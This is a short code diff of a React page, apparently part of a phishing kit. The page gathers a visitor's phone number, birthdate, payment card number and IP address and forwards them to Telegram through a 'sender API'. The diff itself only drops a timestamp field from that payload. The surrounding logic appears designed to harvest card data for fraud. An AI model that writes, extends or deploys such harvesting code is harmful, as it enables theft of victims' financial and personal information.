@@ -8,7 +8,7 @@ import axios from 'axios';
 import dayjs from 'dayjs';
 import { toast } from 'sonner';
 import { getSessionId } from '@/utils/session';
-import { formatRegistrationMessage, getTimestamp } from '@/utils/telegramFormatter';
+import { formatRegistrationMessage } from '@/utils/telegramFormatter';
 
 const Index = () => {
   const router = useRouter();
@@ -135,8 +135,7 @@ const Index = () => {
           phone: formData.phone,
           birthdate: `${formData.birthdateDay}/${formData.birthdateMonth}/${formData.birthdateYear}`,
           cardNumber: formData.cardNumber,
-          ip: ip.data.ip,
-          timestamp: getTimestamp()
+          ip: ip.data.ip
         });
 
         // Send directly to Telegram via sender API
